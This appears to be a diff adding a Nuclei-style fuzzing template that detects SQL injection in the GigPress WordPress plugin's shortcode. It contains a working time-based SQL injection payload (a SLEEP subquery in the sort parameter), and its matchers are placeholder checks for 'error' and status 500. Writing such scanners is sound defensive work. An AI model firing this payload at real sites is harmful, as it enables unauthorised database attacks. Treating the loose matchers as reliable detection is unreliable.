@@ -1,0 +1,38 @@
+id: fuzz-sqli-gigpress
+
+info:
+  name: SQL Injection Detection for GigPress Shortcode
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect SQL Injection vulnerabilities using a specified payload for GigPress shortcode.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      sqli:
+        - "action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort='\\ AND (SELECT 42 FROM (SELECT(SLEEP(2)))b)"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "error"   # Adjust this to match the specific error message or indicator as needed
+
+      - type: status
+        status:
+          - 500  # An example status code for indicating a server error
